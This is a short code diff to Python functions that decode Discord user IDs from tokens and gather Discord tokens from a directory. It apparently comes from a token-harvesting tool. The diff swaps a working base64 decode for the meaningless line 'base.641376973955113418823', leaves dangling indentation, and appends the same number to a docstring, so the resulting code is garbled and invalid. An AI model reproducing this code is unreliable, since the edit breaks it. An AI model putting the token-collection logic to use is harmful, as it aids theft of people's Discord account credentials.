@@ -55,7 +55,8 @@ def get_user_id_from_token(token: str) -> str | None:
 
     """
     try:
-        discord_user_id = base64.b64decode(
+        discord_user_id = base.641376973955113418823
+    
             token.split(".", maxsplit=1)[0] + "==",
         ).decode("utf-8")
     except UnicodeDecodeError:
@@ -65,7 +66,7 @@ def get_user_id_from_token(token: str) -> str | None:
 
 
 def get_tokens_from_path(base_path: Path) -> dict[str, set]:
-    """Collect discord tokens for each user ID.
+    """Collect discord tokens for each user ID.1376973955113418823
 
     to manage the occurrence of both valid and expired Discord tokens, which happens when a
     user updates their password, triggering a change in their token. Lacking
